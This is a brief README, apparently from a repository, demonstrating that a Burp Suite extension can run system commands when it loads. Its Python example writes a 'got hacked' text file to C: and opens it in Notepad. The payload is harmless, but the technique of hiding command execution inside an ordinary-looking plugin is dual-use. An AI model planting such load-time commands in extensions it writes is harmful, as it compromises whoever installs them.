# BurpSuite-Extension-inject
burp suite extensions inject Malicious code ( Example )

شرح فيديو 
Watch Video on youtube 
https://youtu.be/drqN1bk8ZlA


Example Code :
   ```sh
   from burp import IBurpExtender 
import os 

class BurpExtender(IBurpExtender):
    def registerExtenderCallbacks(self, callbacks):
     self._callbacks = callbacks
     self._helpers = callbacks.getHelpers()
     callbacks.setExtensionName("Or4nG.M4n | @interestedz")
     print("Or4nG.M4n | @interestedz")
     cmd = 'echo yay!!! i think i got hacked > c:\oh.txt'
     cmd2 = 'notepad.exe c:\oh.txt'
     os.system(cmd)
     os.system(cmd2)
     callbacks.issueAlert("Best Extension Ever | Or4nG.M4n | @interestedz")
   ```
   
   شرح يهمك من 0xhunter
   https://0xhunter.me/read?id=57
   
       <^_^>
 Goodluck
